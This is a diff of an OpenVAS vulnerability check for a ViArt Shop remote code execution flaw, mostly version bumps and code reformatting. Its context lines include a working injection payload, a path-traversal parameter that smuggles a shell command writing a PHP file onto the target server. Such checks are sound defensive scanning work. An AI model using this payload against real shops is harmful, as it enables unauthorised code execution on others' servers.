@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_viart_shop_rce_2012_09.nasl 13792 2019-02-20 13:15:35Z cfischer $
+# $Id: gb_viart_shop_rce_2012_09.nasl 13994 2019-03-05 12:23:37Z cfischer $
 #
 # ViArt Shop Remote Code Execution Vulnerability
 #
@@ -30,7 +30,7 @@ CPE = "cpe:/a:viart:viart_shop";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.103578");
-  script_version("$Revision: 13792 $");
+  script_version("$Revision: 13994 $");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
   script_name("ViArt Shop Remote Code Execution Vulnerability");
@@ -38,7 +38,7 @@ if(description)
   script_xref(name:"URL", value:"http://www.viart.com/downloads/sips_response.zip");
   script_xref(name:"URL", value:"http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5109.php");
 
-  script_tag(name:"last_modification", value:"$Date: 2019-02-20 14:15:35 +0100 (Wed, 20 Feb 2019) $");
+  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
   script_tag(name:"creation_date", value:"2012-09-26 10:51:47 +0200 (Wed, 26 Sep 2012)");
   script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
@@ -67,8 +67,11 @@ include("host_details.inc");
 include("http_keepalive.inc");
 include("misc_func.inc");
 
-if(!port = get_app_port(cpe:CPE))exit(0);
-if(!dir = get_app_location(cpe:CPE, port:port))exit(0);
+if(!port = get_app_port(cpe:CPE))
+  exit(0);
+
+if(!dir = get_app_location(cpe:CPE, port:port))
+  exit(0);
 
 function exploit(ex, file) {
 
@@ -97,8 +100,8 @@ function exploit(ex, file) {
   }
 }
 
-vtstring = get_vt_string( lowercase:TRUE );
-file = vtstring + '_' + rand() + '.php';
+vtstrings = get_vt_strings();
+file = vtstrings["lowercase_rand"] + ".php";
 ex = "DATA=..%2F..%2F..%2F..%2F..%2F;echo '<?php phpinfo(); ?>' > ./" + file;
 
 exploit(ex:ex, file:file);
